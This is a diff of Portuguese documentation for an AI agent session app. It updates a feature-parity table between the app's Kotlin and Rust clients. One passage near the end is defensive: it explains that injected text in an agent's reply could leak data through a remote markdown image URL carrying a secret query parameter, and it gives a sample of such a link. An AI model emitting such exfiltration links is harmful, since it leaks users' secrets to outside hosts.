@@ -21,7 +21,7 @@ vai para a tabela abaixo, com o motivo. Textos ficam em `android/shared/src/comm
 |---|---|---|---|
 | Login, vários servidores, relogin por servidor | sim | sim | |
 | Abertura da lista sem esperar a resposta dos servidores | sim | sim | Ambos consultam os servidores em paralelo. Pendente no Rust: mostrar «Entrar de novo» imediatamente quando não há cookie local, sem esperar um 401. |
-| Lista: abertas/recentes, busca, filtro por servidor, não lidas, subagentes | sim | sim | Kotlin relê Recentes quando uma sessão some do snapshot; pendente de conferência no Rust. |
+| Lista: abertas/recentes, busca, filtro por servidor, não lidas, subagentes | sim | sim | Ambos releem Recentes quando uma sessão some do snapshot e não está no histórico. |
 | Fixar e favoritar sessões, com filtro Favoritas | sim | sim | marcas independentes e locais; fixadas primeiro dentro dos filtros, por atividade; remoção do servidor limpa só suas marcas |
 | Conversa com markdown, pensamentos e ferramentas compactos, resumo, ir para o fim | sim | sim | Rust: seleção dentro de um bloco + "Copiar mensagem" (limite do Slint) |
 | Resposta aberta e posição de leitura preservadas ao sair e voltar | sim | sim | estado local por conversa; rolar cancela a restauração; quem saiu acompanhando o fim volta ao fim |
@@ -29,19 +29,19 @@ vai para a tabela abaixo, com o motivo. Textos ficam em `android/shared/src/comm
 | Duas colunas a partir de 840 dp, conversa usando a largura toda | sim | sim | celular: uma coluna |
 | Compositor: rascunho, anexos, modos de envio, interrupção, anel de contexto, shake | sim | sim | Rust: sem arrastar arquivos para a janela (Slint 1.18) |
 | Aprovação e perguntas, com resumo `text` e entrada não textual em JSON | sim | sim | Kotlin rola na horizontal; Rust quebra a linha e mostra "mais N linhas" |
-| Folha de permissão fica aberta durante o envio da decisão | sim | pendente de conferência no Rust | conferir o fechamento pelo botão Cancelar e pelo teclado durante o envio |
+| Folha de permissão fica aberta durante o envio da decisão | sim | sim | Enquanto envia, botão Cancelar, Esc e clique fora não fecham a folha. |
 | Chamar personagem (também com conversa aberta em tela larga), dispensar, retomar | sim | sim | pasta da conversa aberta vem primeiro |
-| Confirmações de retomar e dispensar fecham ao trocar de conversa ou servidor | sim | pendente de conferência no Rust | o Rust limpa o diálogo ao observar a troca, mas usa a seleção atual ao confirmar, sem guardar o alvo da abertura |
+| Confirmações de retomar e dispensar fecham ao trocar de conversa ou servidor | sim | sim | A confirmação só vale para o alvo de quando o diálogo abriu. |
 | Linha da lista compacta: horário curto ao lado do título, não lidas na linha de baixo, ações sem botão ⋮ | sim | sim | Kotlin: toque longo; desktop: clique direito. Dispensar pela lista segue **pendente** no Rust (fica no menu da conversa) |
-| Bate-papo paralelo, sem pular para o fim quando se lê acima | sim | sim | abre só pelo menu da conversa. Pendente de conferência no Rust: apagar o rascunho só com confirmação explícita do envio (inclusive ao ocultar a janela) e retomar a consulta após falha de rede. |
+| Bate-papo paralelo, sem pular para o fim quando se lê acima | sim | sim | Abre só pelo menu da conversa. Só apaga o rascunho quando o servidor aceita a pergunta. Enquanto houver resposta em curso, uma consulta que falha é repetida após 3 segundos; o próximo sucesso limpa o erro. |
 | Arquivos da pasta de trabalho: navegar e baixar | sim | sim | Android 10+: Downloads (MediaStore); Android 8/9: pasta Downloads com permissão de armazenamento; iPad: pasta do app; desktop: Downloads |
 | Entregas da sessão: lista e download | sim | pendente no Rust (plano 119) | |
 | Configurações, papéis, resumos por HTTP | sim | sim | |
-| Acesso por servidor em Configurações | sim | pendente no Rust | |
+| Acesso por servidor em Configurações | sim | sim | Mostra conversas, mensagens, aprovações e arquivos. Campo ausente não vira bloqueio; mensagens sem proteção de sessão aparecem bloqueadas com um aviso. |
 | Seletores de modelo: nomes normalizados, busca, OpenRouter por fabricante e preservação do modelo atual | sim | sim | sessão e papéis; datas e variantes distinguem rótulos sem alterar o ID escolhido |
 | ZeroClaw: controles permitidos, sem anel de contexto, elenco pelo runtime | sim | sim | |
 | Espera de `Retry-After` no login limitada a 24 h | sim | sim | |
-| Notificação prioriza a conversa do aviso sobre a última conversa de outro servidor | sim (Android) | pendente de conferência no Rust | A ação «Abrir» no desktop usa a seleção comum e fecha os outros controladores; falta conferir a disputa com a restauração usando dois servidores. |
+| Notificação prioriza a conversa do aviso sobre a última conversa de outro servidor | sim (Android) | sim | «Abrir» cancela a restauração dos outros servidores e abre a sessão do aviso assim que estiver na lista. |
 | Avisos de aprovação, pergunta e fim de turno | sim | sim | Android: serviço em segundo plano; **iPad: sem avisos**; desktop: só com o app aberto |
 | Ícone na bandeja | não se aplica | sim | |
 | Chaveiro destrancado quando o padrão está trancado (Linux) | não se aplica | sim | |
@@ -49,9 +49,9 @@ vai para a tabela abaixo, com o motivo. Textos ficam em `android/shared/src/comm
 | Diagrama Mermaid em tela cheia, com zoom e arrasto | sim | sim | Kotlin: pinça; desktop: botões +/− e teclado +/−, até 8×; arrasto move, duplo clique/toque restaura, Esc ou Fechar sai |
 | Detalhes da sessão e do subagente: seções Estado, Modelo, Contexto e Identificadores; campos vazios ocultos | sim | sim | subagente mostra papel, tarefa, modelo e contexto próprios e leva à sessão principal; identificadores copiáveis |
 | Copiar bloco de código, código do Mermaid e mensagem inteira | sim | sim | |
-| Tentar de novo após erro de envio | sim | sim | Envio ambíguo continua pedindo confirmação. Pendente de conferência no Rust: conflito de envio ou comando após trocar de conversa. A consulta de status Rust já confere o id da operação. |
+| Tentar de novo após erro de envio | sim | sim | Envio ambíguo continua pedindo confirmação. Conflito de envio ou comando só fecha a conversa de origem. Uma consulta de status antiga não altera a operação seguinte. |
 | Blocos `svg` desenhados na conversa, com a mesma tela cheia | sim | sim | desenho local nos dois; `var(--fg)`, `--accent` etc. viram cores fixas sobre fundo branco; Kotlin aceita até 200.000 caracteres |
-| Imagens do markdown abaixo do texto; o link continua no texto; links externos só `http`/`https` | sim | sim | `data:` e caminho absoluto do host (`/api/files/raw`) carregam sozinhos; `http`/`https` só após "Carregar imagem", sem cookies do Habblaud; até 10 MB. Link comum com destino `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp` ou `.svg` também é desenhado; URL solta sem `<>` só no Kotlin. Pendente de conferência no Rust: limites de pixels, cache por bytes, recusa de redirecionamentos e aviso de falha. |
+| Imagens do markdown abaixo do texto; o link continua no texto; links externos só `http`/`https` | sim | sim | `data:` e caminho absoluto do host (`/api/files/raw`) carregam sozinhos; `http`/`https` só após "Carregar imagem", sem credenciais nem redirecionamentos; até 10 MB. Link comum com destino `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp` ou `.svg` também é desenhado; URL solta sem `<>` só no Kotlin. |
 
 ### Diagramas no cliente Kotlin
 
@@ -73,9 +73,10 @@ Tocar no diagrama abre tela cheia: pinça amplia até 8×, arrastar move, toque 
 Baixar imagem remota sozinho deixaria texto injetado na resposta do agente vazar dados pela URL
 (`![](https://site/?segredo=...)`); por isso a remota espera o toque e usa um cliente HTTP sem credenciais.
 Arquivo do host usa a rota e a trava do navegador de arquivos. Se a carga ou a leitura falhar, o link
-permanece no texto. O Kotlin mostra um aviso, não segue redirecionamentos remotos, limita o cache a
-24 MiB e recusa imagens raster acima de 4.096 × 4.096 pixels no total. Kotlin junta as imagens no fim da
-mensagem; Rust põe cada uma logo abaixo do parágrafo que a cita.
+permanece no texto e o cliente mostra um aviso. Ambos recusam imagens raster acima de 4.096 × 4.096
+pixels no total. O Kotlin guarda até 24 MiB de imagens codificadas; o Rust guarda até 64 MiB de imagens
+decodificadas por conversa. Kotlin junta as imagens no fim da mensagem; Rust põe cada uma logo abaixo
+do parágrafo que a cita.
 
 ## Verificação
 
